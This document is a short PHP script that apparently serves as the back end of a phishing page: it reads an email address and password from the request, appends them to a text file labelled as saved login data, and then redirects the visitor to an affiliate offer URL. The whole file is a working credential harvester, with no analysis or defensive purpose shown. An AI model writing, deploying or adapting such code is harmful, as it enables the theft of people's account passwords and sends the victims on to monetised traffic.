<?php
$file = "thoatngheofdfder.txt"; //File for saved data login
$email= $_GET['email'];
$pass= $_GET['pass'];
$handle = fopen($file, 'a');
fwrite($handle, "$email");
fwrite($handle, "|");
fwrite($handle, "$pass");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://www.directoffermature.com/?sl=5206050-19733&data1=Track1&data2=Track2&tag={External_ID_from_traffic_source}&website={subID}&placement={sub_subID}\";
// -->
</script>";

?>